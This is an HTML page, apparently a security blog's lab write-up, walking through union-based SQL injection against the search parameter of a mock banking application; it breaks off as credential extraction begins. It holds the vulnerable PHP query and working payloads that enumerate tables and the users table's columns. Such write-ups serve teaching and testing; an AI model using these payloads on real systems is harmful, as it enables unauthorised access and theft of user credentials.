@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL-Injection in search parameter : | RubberDuck9705</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --neon-green: #00ff41;
+            --dark-green: #00cc33;
+            --bg-dark: #0a0e1a;
+            --bg-darker: #050810;
+            --text-primary: #e0e0e0;
+            --text-muted: #8892b0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background: linear-gradient(135deg, var(--bg-darker) 0%, var(--bg-dark) 50%, #0d1929 100%);
+            color: var(--text-primary);
+            min-height: 100vh;
+            line-height: 1.8;
+        }
+
+        /* Animated grid background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 255, 65, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 65, 0.02) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* Navigation */
+        nav {
+            position: relative;
+            z-index: 100;
+            padding: 2rem 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.1);
+            backdrop-filter: blur(10px);
+        }
+
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 900;
+            color: var(--neon-green);
+            text-decoration: none;
+            letter-spacing: 2px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 3rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 0.95rem;
+            letter-spacing: 1px;
+            transition: color 0.3s ease;
+        }
+
+        .nav-links a:hover {
+            color: var(--neon-green);
+        }
+
+        /* Back button */
+        .back-button {
+            position: relative;
+            z-index: 100;
+            padding: 1rem 5%;
+            margin-bottom: 2rem;
+        }
+
+        .back-button a {
+            display: inline-block;
+            color: var(--neon-green);
+            text-decoration: none;
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
+        }
+
+        .back-button a:hover {
+            transform: translateX(-5px);
+        }
+
+        /* Main content */
+        .writeup-container {
+            position: relative;
+            z-index: 10;
+            max-width: 900px;
+            margin: 0 auto 4rem;
+            padding: 3rem 5%;
+            background: rgba(10, 14, 26, 0.6);
+            border: 1px solid rgba(0, 255, 65, 0.1);
+        }
+
+        /* Style all Notion content */
+        .notion-content h1,
+        .notion-content .page-title {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--neon-green);
+            font-size: 2.5rem;
+            margin-bottom: 1.5rem;
+            text-shadow: 0 0 20px var(--neon-green);
+        }
+
+        .notion-content h2 {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--neon-green);
+            font-size: 1.8rem;
+            margin-top: 3rem;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid rgba(0, 255, 65, 0.3);
+        }
+
+        .notion-content h3 {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--dark-green);
+            font-size: 1.4rem;
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+        }
+
+        .notion-content p {
+            color: var(--text-primary);
+            margin-bottom: 1.5rem;
+            line-height: 1.8;
+        }
+
+        /* Code blocks - Strip all Notion styling and use plain text */
+        .notion-content pre,
+        .notion-content .code {
+            background: rgba(5, 8, 16, 0.95) !important;
+            border: 1px solid rgba(0, 255, 65, 0.3) !important;
+            border-left: 4px solid var(--neon-green) !important;
+            padding: 1.5rem !important;
+            overflow-x: auto !important;
+            margin: 1.5rem 0 !important;
+            border-radius: 0 !important;
+            white-space: pre-wrap !important;
+            word-wrap: break-word !important;
+        }
+
+        /* Remove ALL Notion code styling - including borders and backgrounds */
+        .notion-content pre *,
+        .notion-content .code * {
+            background: none !important;
+            background-color: transparent !important;
+            border: none !important;
+            border-top: none !important;
+            border-bottom: none !important;
+            border-left: none !important;
+            border-right: none !important;
+            box-shadow: none !important;
+            text-shadow: none !important;
+            filter: none !important;
+            opacity: 1 !important;
+            padding: 0 !important;
+            margin: 0 !important;
+            color: var(--neon-green) !important;
+            font-family: 'Fira Code', monospace !important;
+            font-size: 0.9rem !important;
+            line-height: 1.6 !important;
+            font-weight: 400 !important;
+            -webkit-font-smoothing: antialiased !important;
+            -moz-osx-font-smoothing: grayscale !important;
+            text-rendering: optimizeLegibility !important;
+        }
+
+        .notion-content code {
+            font-family: 'Fira Code', monospace !important;
+            color: var(--neon-green) !important;
+            background: none !important;
+            border: none !important;
+        }
+
+        /* Inline code in paragraphs */
+        .notion-content p code,
+        .notion-content li code {
+            background: rgba(0, 255, 65, 0.1) !important;
+            padding: 0.2rem 0.5rem !important;
+            border-radius: 3px !important;
+            border: 1px solid rgba(0, 255, 65, 0.3) !important;
+        }
+
+        /* Remove any weird Notion dividers/separators */
+        .notion-content pre hr,
+        .notion-content .code hr,
+        .notion-content pre div,
+        .notion-content .code div {
+            display: none !important;
+        }
+
+        /* Images */
+        .notion-content img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            margin: 1.5rem 0;
+            display: block;
+        }
+
+        .notion-content figure {
+            margin: 2rem 0;
+        }
+
+        /* Links */
+        .notion-content a {
+            color: var(--neon-green);
+            text-decoration: none;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .notion-content a:hover {
+            border-bottom-color: var(--neon-green);
+            text-shadow: 0 0 8px var(--neon-green);
+        }
+
+        /* Lists */
+        .notion-content ul,
+        .notion-content ol {
+            margin: 1rem 0 1.5rem 2rem;
+        }
+
+        .notion-content li {
+            margin-bottom: 0.5rem;
+        }
+
+        /* Collapsible sections (details/summary) */
+        .notion-content details {
+            background: rgba(0, 255, 65, 0.05);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            padding: 1rem;
+            margin: 1.5rem 0;
+        }
+
+        .notion-content summary {
+            cursor: pointer;
+            font-weight: 600;
+            color: var(--neon-green);
+            font-family: 'Orbitron', sans-serif;
+            user-select: none;
+            font-size: 1.25rem;
+        }
+
+        .notion-content summary:hover {
+            text-shadow: 0 0 8px var(--neon-green);
+        }
+
+        /* Tables */
+        .notion-content table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+        }
+
+        .notion-content th,
+        .notion-content td {
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            padding: 0.75rem;
+            text-align: left;
+        }
+
+        .notion-content th {
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--neon-green);
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        /* Blockquotes */
+        .notion-content blockquote {
+            border-left: 4px solid var(--neon-green);
+            padding-left: 1.5rem;
+            margin: 1.5rem 0;
+            color: var(--text-muted);
+            font-style: italic;
+        }
+
+        /* Footer */
+        footer {
+            position: relative;
+            z-index: 10;
+            text-align: center;
+            padding: 2rem 5%;
+            border-top: 1px solid rgba(0, 255, 65, 0.1);
+            color: var(--text-muted);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .notion-content h1 {
+                font-size: 2rem;
+            }
+
+            .notion-content h2 {
+                font-size: 1.5rem;
+            }
+
+            .writeup-container {
+                padding: 2rem 1rem;
+            }
+
+            .nav-links {
+                gap: 1.5rem;
+                font-size: 0.85rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <nav>
+        <a href="../../index.html" class="logo">RUBBERDUCK9705</a>
+        <ul class="nav-links">
+            <li><a href="../../index.html#blog">BLOG</a></li>
+            <li><a href="../../index.html#labs">LABS</a></li>
+            <li><a href="../../index.html#htb">HTB WRITEUPS</a></li>
+            <li><a href="../../index.html#about">ABOUT</a></li>
+        </ul>
+    </nav>
+
+    <div class="back-button">
+        <a href="../../index.html#htb">← Back to HTB WriteUps</a>
+    </div>
+
+    <main class="writeup-container">
+        <div class="notion-content">
+<header><h1 class="page-title" dir="auto">SQL-Injection in search parameter :</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="auto"><hr id="2c4dd632-11a2-801e-b9b1-c814eb258aee"/></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-8009-ae0b-c12733e61907" class=""><em><strong>Application is running on LAMP-Stack : Linux, Apache, MySQL &amp; PHP</strong></em></p></div><div style="display:contents" dir="auto"><h3 id="2c4dd632-11a2-80f3-8124-cef0dd60dd90" class=""><em>Overview :</em></h3></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-80a7-b693-c766ae17014c" class="">This is a <em><strong>SQL-injection attack </strong></em>targeting a vulnerable search feature/parameter in a “fake” banking application.</p></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-800f-8e3c-e79ff20865f7" class="">This show why inadequate input sanitization is needed.</p></div><div style="display:contents" dir="auto"><hr id="2c4dd632-11a2-80ea-a71c-f5a23e88eb60"/></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-8058-b27a-d3948b54c7a6" class="">In this case as u will see the vulnerability lies in the vulnerable parameter: <code>search</code> inside <code>transactions.php</code>. The issue exists in the way user input is directly incorporated into SQL queries without proper validation or parameterization.</p></div><div style="display:contents" dir="auto"><hr id="2c4dd632-11a2-80f5-a3dc-ee2bdfbcc4cc"/></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-8018-bc57-f7a0528009b5" class="">First we will display how to exfiltrate data from the database manually and then utilize <code>SQLmap</code> to dump the entire <em><strong>db.</strong></em></p></div><div style="display:contents" dir="auto"><hr id="2c4dd632-11a2-8049-9315-d8fe9955cde6"/></div><div style="display:contents" dir="auto"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">How It Works Manually :</summary><div class="indented"><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-80cf-ad3c-ec7c72c4b5b2" class=""><em><strong>Closing the Original Query :</strong></em></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2c4dd632-11a2-80dc-bb7b-f08bcc00d9c8" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&#x27;)</code></pre></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-808e-a856-fc085299f0b0" class=""><em><strong>The application has the following query :</strong></em></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2c4dd632-11a2-8033-bc47-d36e0362d365" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">$search = $_GET[&#x27;search&#x27;] ?? &#x27;&#x27;;
+
+if($search) {
+    $query = &quot;SELECT * FROM transactions WHERE user_id = $user_id AND (description LIKE &#x27;%$search%&#x27; OR recipient LIKE &#x27;%$search%&#x27;) ORDER BY transaction_date DESC&quot;;</code></pre></div><div style="display:contents" dir="auto"><ul id="2c4dd632-11a2-80fd-a545-cc7fbba8458d" class="bulleted-list"><li style="list-style-type:disc">The <code>&#x27;)</code> closes the original <code>LIKE</code> clause and its parentheses.</li></ul></div><div style="display:contents" dir="auto"><ul id="2c4dd632-11a2-807f-924c-fa01f8118b29" class="bulleted-list"><li style="list-style-type:disc">This effectively terminates the legitimate query.</li></ul></div><div style="display:contents" dir="auto"><hr id="2c4dd632-11a2-8055-a1a3-fe90b8d97d81"/></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-8053-8c23-d0d56644ec44" class="">First part of the attack is always to identify whenever SQLi is possible and how the backend handles user supplied input.</p></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-80c8-a531-f3461f18a5e6" class="">By using a automated tool like Burp Suite we can use a brute attack like <em><strong>Intruder (Sniper Attack)</strong></em> or in this case do it manually :</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2c4dd632-11a2-8096-8393-cbde26a96c3a" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&#x27; -&gt; Throws a 500</code></pre></div><div style="display:contents" dir="ltr"><figure id="2c4dd632-11a2-80aa-aec8-f9df938d81a1" class="image"><a href="image.png"><img style="width:392px" src="image.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="2c4dd632-11a2-8098-ad67-fcb4c5caca94" class="image"><a href="image%201.png"><img style="width:480px" src="image%201.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-8027-ad99-dd8c97c05c25" class="">Its a question of trying different things and payloads to identify whats working :</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2c4dd632-11a2-80ac-82cf-c439d68bd634" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&#x27;)-- -</code></pre></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-8046-8e43-cdefd5bc69b4" class="">Payload above worked.</p></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-80e4-8e94-dc6051a76e53" class=""><em><strong>The Simple Explanation :</strong></em></p></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-809f-91fb-f9fb3331ce74" class="">The original query has :</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2c4dd632-11a2-80ed-aa0a-c3dc0507c65f" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">LIKE &#x27;%$search%&#x27;</code></pre></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-80c4-8038-cf92873d36d9" class="">When we inject <code>&#x27;)-- -</code> it becomes :</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2c4dd632-11a2-8004-9a01-db6b67635bf9" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">LIKE &#x27;%&#x27;)-- -</code></pre></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-80df-b35f-cf40b5643824" class=""><code>&#x27;</code> - Closes the string that started with <code>&#x27;%</code></p></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-8098-a2c7-fee80dee8856" class=""><code>)</code> - Closes the parenthesis from <code>(description LIKE ... OR recipient LIKE...)</code></p></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-8096-991f-c0038ffa5519" class=""><code>--</code> - SQL comment symbol (Everything after this is ignored/commented out)</p></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-80c1-9dd1-caddc40ee8af" class="">
+</p></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-80ab-b2c7-c41e811014e6" class="">Basically it says : “End the search here <code>)</code>, then run MY query <code>UNION SELECT</code> Then ignore everything else <code>-- -</code></p></div><div style="display:contents" dir="auto"><hr id="2c5dd632-11a2-80d7-9ab0-e199419a406c"/></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-809d-9cd4-d8e115328270" class=""><code>UNION SELECT</code> statements :</p></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-8059-bb14-d86ef1c0e6bb" class="">Using the above statement. Whenever a webapplication returns the results of the query within it HTTP response it is possible to use <code>UNION</code> to get/retrive data from other tables within the applications database.</p></div><div style="display:contents" dir="auto"><hr id="2c5dd632-11a2-80c0-8ca3-e68e020f941d"/></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-800d-b32f-e31797eef399" class="">Before we can take advantage of this we have to determine the number of columns that are being returned within the original query.</p></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-8051-a66d-f9c2515543d0" class="">For this we will utilize the <code>ORDER BY</code> clause and keep increaing the column index until the application throws an error. The error indicates that the number of tables are invalid/incorrect.</p></div><div style="display:contents" dir="auto"><hr id="2c5dd632-11a2-80fe-91e3-dd7ae59de67f"/></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-80b4-b6db-c97a46304e55" class=""><em><strong>Payload : </strong></em></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2c5dd632-11a2-8029-b3bc-d1332c30bf3d" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&#x27;) ORDER BY 1-- -</code></pre></div><div style="display:contents" dir="auto"><p id="2c4dd632-11a2-804d-b5e8-f61bb84e8661" class="">In this case we can just inject the payload “as is” without any URL-encoding since our browser handles this automatically “In this instance” :</p></div><div style="display:contents" dir="ltr"><figure id="2c5dd632-11a2-800f-bd3d-dadb896114fc" class="image"><a href="image%202.png"><img style="width:681.984375px" src="image%202.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-80b2-b6fd-d9275af306b1" class="">We increase the index/value until the application throws/returns an error :</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2c5dd632-11a2-8037-9557-e27874c26355" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&#x27;) ORDER BY 8-- -</code></pre></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-807f-a0e5-c2825ded3a97" class="">Going beyond the value of 8 we receive an error :</p></div><div style="display:contents" dir="ltr"><figure id="2c5dd632-11a2-803b-aa65-ecc997c95a06" class="image"><a href="image%203.png"><img style="width:681.984375px" src="image%203.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-80cf-9ca6-e7d25b2fc84d" class="">Therefor, we know the application returns 8 columns and we can proceed to our <code>UNION Attack</code> :</p></div><div style="display:contents" dir="ltr"><figure id="2c5dd632-11a2-8098-878a-e08bf211b191" class="image"><a href="image%204.png"><img style="width:681.96875px" src="image%204.png"/></a></figure></div><div style="display:contents" dir="auto"><hr id="2c5dd632-11a2-8068-8246-f6419d2247ef"/></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-8060-8802-e96445107683" class="">For this, we will submit a series of <code>NULL</code> values matching the numer of columns(8) within the table :</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2c5dd632-11a2-802c-be48-f6cbafad51d0" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&#x27;) UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- -</code></pre></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-8030-ab40-eb67ba68e08e" class="">To determine the datatype of a column (integer or string), we can simply make the <code>NULL</code> value into a string by using <code>&#x27;&#x27;</code>. Again, if the application returns an error we know that it isn’t valid or correct and by doing it methodically for each <code>NULL</code> value we can enumerate the data type of each column within the table.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2c5dd632-11a2-8002-bd14-c544f96f9637" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&#x27;) UNION SELECT &#x27;NULL&#x27;, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- -</code></pre></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-80ee-84b0-eaa42001f55b" class="">For the sake of our sanity most of the <code>NULL</code> values are strings which makes os proceed to the next step. Getting the table name :</p></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-80ed-a93d-c0e662d829ba" class="">Using a common set of views called <code>information_schema.tables</code> we can list the tables in the database :</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2c5dd632-11a2-8086-a882-da42c8d8cb29" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&#x27;) UNION SELECT table_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.tables-- -</code></pre></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-8012-9a57-e328723343af" class="">Data is obviously returned by the output/values are being shown in the wrong column. Remember that each <code>NULL</code> value is also a column within the table and depending of the structure if the page it isn’t shown probably. Hence why we try and move the <code>table_name</code> to another column/position :</p></div><div style="display:contents" dir="ltr"><figure id="2c5dd632-11a2-8017-9f3e-ee24be69194f" class="image"><a href="image%205.png"><img style="width:681.96875px" src="image%205.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-804a-8e07-f50ec1e28d41" class="">The output now shows us a lot of different tables. In this case we will focus on extracting/dumping the data from the <code>users</code> table :</p></div><div style="display:contents" dir="ltr"><figure id="2c5dd632-11a2-8085-ac99-c08f9c83f420" class="image"><a href="image%206.png"><img style="width:681.984375px" src="image%206.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-8097-a86e-efc69bc85734" class="">Now we can do the exact same thing with the column names but this time focusing on the table <code>users</code> :</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2c5dd632-11a2-803e-b981-d6893c6626c8" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&#x27;) UNION SELECT NULL, NULL, column_name, NULL, NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name=&#x27;users&#x27;-- -</code></pre></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-8041-a50f-e08bf46ca8c0" class="">In the payload about we changed it to → Get the names of each column <code>WHERE</code> table_name = ‘users’ :</p></div><div style="display:contents" dir="ltr"><figure id="2c5dd632-11a2-8075-9aa8-cb950cf38d4e" class="image"><a href="image%207.png"><img style="width:681.96875px" src="image%207.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2c5dd632-11a2-80f5-b77f-f3483576c2cc" class="">The juicy part is now, to use concatenation to extract the contents of the columns username and password :</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" 